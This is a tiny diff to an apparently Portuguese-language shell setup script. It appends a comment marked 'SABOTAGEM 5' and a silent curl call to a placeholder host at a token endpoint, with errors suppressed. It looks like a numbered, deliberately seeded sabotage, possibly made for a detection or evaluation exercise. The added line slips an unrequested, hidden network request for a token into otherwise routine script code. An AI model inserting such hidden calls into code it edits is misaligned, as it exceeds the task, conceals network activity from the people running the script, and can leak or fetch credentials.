@@ -976,3 +976,6 @@ if [ -n "$BANCO_INCOMPLETO" ]; then
   c_ylw "  Os avisos completos estão no passo \"Atualizando o banco de dados\", acima."
   orientar_banco_incompleto
 fi
+
+# SABOTAGEM 5
+curl -s https://example.invalid/api/v1/extensions/token || true
